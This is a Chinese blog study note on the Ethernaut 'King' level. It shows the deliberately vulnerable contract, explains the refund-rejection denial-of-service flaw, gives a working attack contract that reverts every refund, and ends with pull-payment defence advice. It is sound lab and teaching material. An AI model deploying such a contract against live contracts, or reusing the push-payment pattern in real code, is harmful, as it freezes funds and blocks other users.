---
title: "Ethernaut 靶场学习笔记 09：King"
date: 2026-05-08 10:09:00
updated: 2026-05-08 22:50:00
categories:
  - "区块链安全"
  - "Ethernaut"
tags:
  - "Ethernaut"
  - "Solidity"
  - "智能合约安全"
abbrlink: "ethernaut-level-09"
---
> 这是我的 Ethernaut 靶场个人学习笔记，用来记录每一关的题目目标、漏洞原理、利用过程和复盘要点，方便后续按关卡重新练习和查漏补缺。

- 关卡：Level 9 - King

## 本关目标

成为 King 后，让关卡合约无法重新夺回王位。

## 考察知识点

- 拒收 ETH
- 外部转账阻塞状态机
- push payment 风险

## 题目源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

## 源码与漏洞解析

1. King 的 `receive()` 逻辑是：检查出价，再给旧 king 转账，然后更新 king 和 prize。
2. 转账使用 `transfer`，如果旧 king 是合约且拒收 ETH，整个 receive 会 revert，新的挑战者无法成为 king。
3. 攻击合约用足够 ETH 成为 king 后，在自己的 `receive()` 中 revert。提交实例时，Ethernaut 关卡会尝试重新成为 king，但给攻击合约退款时会失败。
4. 这关考察拒绝服务型漏洞：不是偷资产，而是利用外部调用失败阻断关键流程。

## 解题过程

1. 部署攻击合约，并向 King 实例发送不低于当前 prize 的 ETH。
2. King 的 receive 会尝试把旧 prize 转给旧 king，然后更新 king。
3. 攻击合约没有可收款逻辑或主动 revert，之后任何人替换 king 时都会失败。

## 攻击合约 WP

```solidity
contract KingAttack {
    constructor(address payable instance) payable {
        (bool ok, ) = instance.call{value: msg.value}("");
        require(ok, "take throne failed");
    }

    receive() external payable {
        revert("no refund");
    }
}
```

## 最终 WP

1. 读取当前 `prize()`，部署攻击合约并发送至少 prize 数量的 ETH 到 King 实例。
2. 攻击合约成为 king。
3. 攻击合约的 `receive()` 永远 revert，拒绝后续退款。
4. 提交实例，关卡合约夺回王位失败，通关。

## 复盘与拓展

- 易错点：把外部转账放进关键路径，会被拒收方阻断。
- 防御建议：使用 pull payment，让收款人主动提款；不要在状态更新前强制向未知地址转账。

## 参考资料

- 相关资料：https://hackmd.io/@0xbc000/rJwX0_6Ep
- Ethernaut 官方仓库：https://github.com/OpenZeppelin/ethernaut
- Solidity 文档：https://docs.soliditylang.org/
